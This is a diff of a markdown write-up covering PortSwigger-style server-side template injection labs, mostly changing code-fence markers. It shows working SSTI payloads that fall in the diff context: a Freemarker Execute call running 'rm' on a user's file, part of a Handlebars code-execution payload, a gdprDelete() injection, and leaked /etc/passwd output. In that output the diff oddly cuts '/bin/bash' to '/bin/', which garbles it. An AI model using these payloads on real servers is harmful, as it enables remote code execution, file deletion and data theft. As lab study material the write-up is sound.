@@ -2,7 +2,7 @@
 ## Server-side Template Injection (SSTI)
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/
 ### Basic server-side template injection
-```bash
+``````
 
 # This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.
 
@@ -62,7 +62,7 @@ Response:
 
 HTTP/1.1 200 OK
 
-```
+``````
 
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601205114.png)
 
@@ -75,7 +75,7 @@ HTTP/1.1 200 OK
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601211229.png)
 
 ### Basic server-side template injection (code context)
-```bash
+``````
 
 # This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
 
@@ -158,7 +158,7 @@ https://0a3d00c1040fc12dc0c79efe00d00074.web-security-academy.net/post?postId=2
 
 Refresh the page
 
-```
+``````
 
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601213436.png)
 
@@ -171,7 +171,7 @@ Refresh the page
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601215011.png)
 
 ### Server-side template injection using documentation
-```bash
+``````
 
 # This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
 
@@ -246,7 +246,7 @@ Freemarker - Code execution:
 
 ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
 
-```
+``````
 
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601233205.png)
 
@@ -261,7 +261,7 @@ ${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601234102.png)
 
 ### Server-side template injection in an unknown language with a documented exploit
-```bash
+``````
 
 # This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory. 
 
@@ -380,7 +380,7 @@ GET /?message={{%23with+"s"+as+|string|}}{{%23with+"e"}}{{%23with+split+as+|cons
 
 Send
 
-```
+``````
 
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220601234926.png)
 
@@ -391,7 +391,7 @@ Send
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602001802.png)
 
 ### Server-side template injection with information disclosure via user-supplied objects
-```bash
+``````
 
 # This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data.
 
@@ -431,7 +431,7 @@ Output:
 
 b47c1ee6ef9ckx5gfoiwi2x79ep57l1m
 
-```
+``````
 
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602003900.png)
 
@@ -440,7 +440,7 @@ b47c1ee6ef9ckx5gfoiwi2x79ep57l1m
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602011308.png)
 
 ### Server-side template injection in a sandboxed environment
-```bash
+``````
 
 # This lab uses the Freemarker template engine. It is vulnerable to server-side template injection due to its poorly implemented sandbox. To solve the lab, break out of the sandbox to read the file my_password.txt from Carlos's home directory. Then submit the contents of the file.
 
@@ -537,7 +537,7 @@ Output:
 
 4yr640yedw9ihrrgm503
 
-```
+``````
 
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602013445.png)
 
@@ -548,7 +548,7 @@ Output:
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602014703.png)
 
 ### Server-side template injection with a custom exploit
-```bash
+``````
 
 # This lab is vulnerable to server-side template injection. To solve the lab, create a custom exploit to delete the file /.ssh/id_rsa from Carlos's home directory.
 
@@ -635,7 +635,7 @@ GET /avatar?avatar=wiener HTTP/1.1
 
 Send
 
-root:x:0:0:root:/root:/bin/bash
+root:x:0:0:root:/root:/bin/
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
 sys:x:3:3:sys:/dev:/usr/sbin/nologin
@@ -654,11 +654,11 @@ irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
 gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
 _apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-peter:x:12001:12001::/home/peter:/bin/bash
-carlos:x:12002:12002::/home/carlos:/bin/bash
-user:x:12000:12000::/home/user:/bin/bash
-elmer:x:12099:12099::/home/elmer:/bin/bash
-academy:x:10000:10000::/academy:/bin/bash
+peter:x:12001:12001::/home/peter:/bin/
+carlos:x:12002:12002::/home/carlos:/bin/
+user:x:12000:12000::/home/user:/bin/
+elmer:x:12099:12099::/home/elmer:/bin/
+academy:x:10000:10000::/academy:/bin/
 messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
 dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
 
@@ -727,7 +727,7 @@ To
 
 blog-post-author-display=user.gdprDelete()&csrf=2lBmtB05EzcuAUQDwapveJa0k0t2dTvm
 
-```
+``````
 
 ![image](https://m0d1cumc0rvu5.github.io/docs/assets/images/20220602015431.png)
 
